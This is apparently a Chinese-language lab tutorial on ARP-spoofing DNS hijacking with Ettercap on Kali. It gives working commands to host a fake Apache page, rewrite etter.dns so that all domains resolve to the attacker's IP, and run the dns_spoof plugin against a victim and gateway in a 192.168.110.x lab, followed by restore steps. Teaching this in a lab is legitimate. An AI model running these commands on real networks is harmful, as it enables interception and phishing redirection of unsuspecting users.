### ARP-Ettercap DNS劫持

#### 什么是DNS

​		概念
​			DNS是Domain Name System的缩写, 我们称之域名系统
​			他要完成的任务是帮我们把输入的域名转换成ip地址
​		工作过程
​			先找DNS缓存
​			再找host配置
​			最终查找DNS服务器
​			

#### 什么是DNS劫持

​	概念
​		 DNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。

##### 	ettercap劫持的原理

​		局域网劫持, 攻击者通过伪装成网关, 劫持受害者的网络请求, 将网络请求拦截到指定的服务器
​	DNS常用命令
​		查看DNS缓存表
​			ipconfig /displaydns
​		刷新DNS缓存
​			ipconfig /flushdns

#### ARP-DNS欺骗攻击步骤

##### 	kali开启apache服务

​		service apache2 start
​		service apache2 status

##### 	浏览器访问Apache的首页

​		http://192.168.110.12

##### 	编辑ettercap配置文件

​		进入配置文件位置
​			cd /etc/ettercap
​		复制原有的配置文件（环境恢复比较方便）
​			cp etter.dns etter.dns1
​		设置dns劫持配置文件
​			vi /etc/ettercap/etter.dns
​				添加以下内容

					*   A   192.168.110.12
					*   PTR 192.168.110.12
				参数讲解
					*:代表所有的网站 也可设置某个网站 www.mashibing.com
					A:代表钓鱼的ip地址
					PTR ：常被用于反向地址解析
				
	
	##### ettercap劫持命令讲解
	
	​	ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /被攻击者ip// /被攻击者网关// 
	​		-i：网卡
	​		 -T：文本模式
	​		 -q：安静模式
	​		 -M：执行mitm攻击
	​		-P：plugin 开始该插件
	靶机访问以下网站确认环境正常
	​	http://www.mashibing.com/
	​	http://m.ctrip.com
	​	http://www.jd.com/
	​	ping www.mashibing.com
	​	ping m.ctrip.com
	​	ping www.jd.com
	
	##### 执行劫持命令
	
	​	ettercap -i eth0 -Tq -M arp:remote -P dns_spoof /192.168.110.11// /192.168.110.1// >b.txt
	分析日志
	​	tail -f b.txt
	​	tail -f b.txt | grep "dns_spoof"
	
	##### 靶机访问以下网站查看攻击效果
	
	​	http://www.mashibing.com/
	​	http://m.ctrip.com
	​	http://www.jd.com/
	​	ping www.mashibing.com
	​	ping m.ctrip.com
	​	ping www.jd.com
	停止劫持
	​	Ctrl+C
	恢复dns劫持，刷新dns缓存即可
	​	ipconfig /flushdns
	靶机访问以下网站查看环境是否恢复正常
	​	http://www.mashibing.com/
	​	http://m.ctrip.com
	​	http://www.jd.com/
	​	ping www.mashibing.com
	​	ping m.ctrip.com
	​	ping www.jd.com
	恢复kali环境
	​	进入配置文件位置
	​		cd /etc/ettercap
	​	复制dns文件到新文件
	​		cp etter.dns etter.dns2
	​	删除配置好的攻击文件
	​		rm etter.dns
	​	还原dns配置文件
	​		cp etter.dns1 etter.dns